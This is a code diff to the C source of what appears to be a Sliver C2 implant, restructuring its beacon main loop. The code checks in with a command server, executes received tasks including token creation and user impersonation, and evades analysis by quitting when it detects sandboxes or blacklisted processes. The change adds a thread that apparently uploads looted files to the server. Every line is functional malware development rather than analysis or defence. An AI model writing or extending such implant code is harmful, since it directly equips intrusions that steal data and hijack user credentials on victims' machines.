@@ -415,6 +415,7 @@ VOID BeaconMainLoop
 	PENVELOPE pReturnedEnvelope = NULL;
 	LPSTR lpError = NULL;
 	UINT64 uType = 0;
+	DWORD dwThreadID = 0;
 
 	hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
 	pSliverPool = InitializeSliverThreadPool();
@@ -454,91 +455,102 @@ VOID BeaconMainLoop
 			goto CONTINUE;
 		}
 
-		dwNumberOfAttempts = 0;
-		while (TRUE) {
-#ifndef _DEBUG
-			if (DetectSandbox1() || DetectSandbox2() || CheckForBlackListProcess()) {
-				goto CLEANUP;
-			}
-#endif
-
-			if (dwNumberOfAttempts >= pConfig->dwMaxFailure) {
-				goto CONTINUE;
-			}
-
-			pNextCheckinEnvelope = MarshalBeaconTasks(pBeacon, GetNextCheckin(pBeacon), NULL, 0);
-			if (!pBeacon->Send(pConfig, pBeacon->lpClient, pNextCheckinEnvelope)) {
-				FreeEnvelope(pNextCheckinEnvelope);
-				dwNumberOfAttempts++;
-				goto SLEEP;
-			}
-
-			dwNumberOfAttempts = 0;
-			FreeEnvelope(pNextCheckinEnvelope);
-			pRecvEnvelope = pBeacon->Receive(pConfig, pBeacon->lpClient);
-			if (pRecvEnvelope != NULL && pRecvEnvelope->pData != NULL) {
-				BeaconTask = UnmarshalBeaconTasks(pRecvEnvelope);
-
-				pWrapper = ALLOC(sizeof(BEACON_TASKS_WRAPPER));
-				pWrapper->pTaskList = BeaconTask->EnvelopeList;
-				pWrapper->dwNumberOfTasks = BeaconTask->dwNumberOfEnvelopes;
-				for (j = 0; j < pWrapper->dwNumberOfTasks; j++) {
-					uType = pWrapper->pTaskList[j]->uType;
-					if (uType == MsgMakeTokenReq || uType == MsgRevToSelf || uType == MsgImpersonateReq) {
-						SecureZeroMemory(wszLogName, sizeof(wszLogName));
-						GetTempPathW(_countof(wszLogName), wszLogName);
-						wsprintfW(&wszLogName[lstrlenW(wszLogName)], L"log_%d.txt", GetCurrentThreadId());
-						CreateEmptyFileW(wszLogName);
-						if (uType == MsgMakeTokenReq) {
-							pReturnedEnvelope = MakeTokenHandler(pWrapper->pTaskList[j], pBeacon);
-						}
-						else if (uType == MsgRevToSelf) {
-							pReturnedEnvelope = RevToSelfHandler(pWrapper->pTaskList[j], pBeacon);
-						}
-						else if (uType == MsgImpersonateReq) {
-							pReturnedEnvelope = ImpersonateHandler(pWrapper->pTaskList[j], pBeacon);
-						}
-
-						if (pReturnedEnvelope == NULL) {
-							lpError = ReadFromFile(wszLogName, NULL);
-							if (lpError != NULL && lstrlenA(lpError) > 0) {
-								pReturnedEnvelope = CreateErrorRespEnvelope(lpError, 9, pRecvEnvelope->uID);
-							}
-							else {
-								pReturnedEnvelope = CreateErrorRespEnvelope("Failed to execute command (Unknown Error)", 9, pRecvEnvelope->uID);
-							}
-
-							FREE(lpError);
-						}
-
-						pReturnedEnvelope->uType = uType;
-						pWrapper->pTaskList[j] = pReturnedEnvelope;
-						DeleteFileW(wszLogName);
-
-					}
-				}
-				pWrapper->hEvent = hEvent;
-				pWrapper->pBeacon = pBeacon;
-
-				FREE(BeaconTask->lpInstanceID);
-				FREE(BeaconTask);
-				pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)BeaconWork, pWrapper, &pSliverPool->CallBackEnviron);
-				TpPostWork(pWork);
-			}
-
-			FreeEnvelope(pRecvEnvelope);
-SLEEP:
-			WaitForSingleObject(hEvent, GetNextCheckin(pBeacon) * 1000);
-		}
-
+		break;
 CONTINUE:
 		pBeacon->Close(pBeacon->lpClient);
 		pBeacon->Cleanup(pBeacon->lpClient);
 		pBeacon->lpClient = NULL;
 	}
 
+	if (pBeacon->lpClient == NULL) {
+		goto CLEANUP;
+	}
+
+	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SliverUploadLootedFile, (PSLIVER_SESSION_CLIENT)pBeacon, 0, &dwThreadID);
+	dwNumberOfAttempts = 0;
+	while (TRUE) {
+#ifndef _DEBUG
+		if (DetectSandbox1() || DetectSandbox2() || CheckForBlackListProcess()) {
+			goto CLEANUP;
+		}
+#endif
+		if (dwNumberOfAttempts >= pConfig->dwMaxFailure) {
+			goto CLEANUP;
+		}
+
+		pNextCheckinEnvelope = MarshalBeaconTasks(pBeacon, GetNextCheckin(pBeacon), NULL, 0);
+		if (!pBeacon->Send(pConfig, pBeacon->lpClient, pNextCheckinEnvelope)) {
+			FreeEnvelope(pNextCheckinEnvelope);
+			dwNumberOfAttempts++;
+			goto SLEEP;
+		}
+
+		dwNumberOfAttempts = 0;
+		FreeEnvelope(pNextCheckinEnvelope);
+		pRecvEnvelope = pBeacon->Receive(pConfig, pBeacon->lpClient);
+		if (pRecvEnvelope != NULL && pRecvEnvelope->pData != NULL) {
+			BeaconTask = UnmarshalBeaconTasks(pRecvEnvelope);
+
+			pWrapper = ALLOC(sizeof(BEACON_TASKS_WRAPPER));
+			pWrapper->pTaskList = BeaconTask->EnvelopeList;
+			pWrapper->dwNumberOfTasks = BeaconTask->dwNumberOfEnvelopes;
+			for (j = 0; j < pWrapper->dwNumberOfTasks; j++) {
+				uType = pWrapper->pTaskList[j]->uType;
+				if (uType == MsgMakeTokenReq || uType == MsgRevToSelf || uType == MsgImpersonateReq) {
+					SecureZeroMemory(wszLogName, sizeof(wszLogName));
+					GetTempPathW(_countof(wszLogName), wszLogName);
+					wsprintfW(&wszLogName[lstrlenW(wszLogName)], L"log_%d.txt", GetCurrentThreadId());
+					CreateEmptyFileW(wszLogName);
+					if (uType == MsgMakeTokenReq) {
+						pReturnedEnvelope = MakeTokenHandler(pWrapper->pTaskList[j], pBeacon);
+					}
+					else if (uType == MsgRevToSelf) {
+						pReturnedEnvelope = RevToSelfHandler(pWrapper->pTaskList[j], pBeacon);
+					}
+					else if (uType == MsgImpersonateReq) {
+						pReturnedEnvelope = ImpersonateHandler(pWrapper->pTaskList[j], pBeacon);
+					}
+
+					if (pReturnedEnvelope == NULL) {
+						lpError = ReadFromFile(wszLogName, NULL);
+						if (lpError != NULL && lstrlenA(lpError) > 0) {
+							pReturnedEnvelope = CreateErrorRespEnvelope(lpError, 9, pRecvEnvelope->uID);
+						}
+						else {
+							pReturnedEnvelope = CreateErrorRespEnvelope("Failed to execute command (Unknown Error)", 9, pRecvEnvelope->uID);
+						}
+
+						FREE(lpError);
+					}
+
+					pReturnedEnvelope->uType = uType;
+					pWrapper->pTaskList[j] = pReturnedEnvelope;
+					DeleteFileW(wszLogName);
+
+				}
+			}
+			pWrapper->hEvent = hEvent;
+			pWrapper->pBeacon = pBeacon;
+
+			FREE(BeaconTask->lpInstanceID);
+			FREE(BeaconTask);
+			pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)BeaconWork, pWrapper, &pSliverPool->CallBackEnviron);
+			TpPostWork(pWork);
+		}
+
+		FreeEnvelope(pRecvEnvelope);
+	SLEEP:
+		WaitForSingleObject(hEvent, GetNextCheckin(pBeacon) * 1000);
+	}
+
 CLEANUP:
 	FreeSliverThreadPool(pSliverPool);
+	if (pBeacon->lpClient != NULL) {
+		pBeacon->Close(pBeacon->lpClient);
+		pBeacon->Cleanup(pBeacon->lpClient);
+		pBeacon->lpClient = NULL;
+	}
+
 	if (hEvent != NULL) {
 		CloseHandle(hEvent);
 	}
